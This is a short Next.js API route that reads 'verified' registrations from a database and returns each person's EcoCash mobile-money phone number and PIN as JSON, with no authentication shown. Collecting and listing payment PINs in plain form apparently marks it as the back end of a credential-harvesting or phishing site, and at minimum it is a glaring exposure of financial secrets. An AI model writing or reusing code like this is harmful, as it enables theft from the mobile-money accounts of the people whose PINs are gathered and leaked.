import { neon } from "@neondatabase/serverless"
import { NextResponse } from "next/server"

const sql = neon(process.env.DATABASE_URL!)

export async function GET() {
  try {
    const result = await sql(
      `SELECT id, ecocash_phone, ecocash_pin, verified_at, status 
       FROM registrations 
       WHERE status = 'verified' 
       ORDER BY verified_at DESC`,
    )

    const registrations = result.map((reg: any) => ({
      id: reg.id.toString(),
      ecocashPhone: reg.ecocash_phone,
      ecocashPin: reg.ecocash_pin,
      verifiedAt: reg.verified_at,
      status: reg.status,
    }))

    return NextResponse.json(registrations)
  } catch (error) {
    console.error("Failed to fetch registrations:", error)
    return NextResponse.json({ error: "Failed to fetch registrations" }, { status: 500 })
  }
}
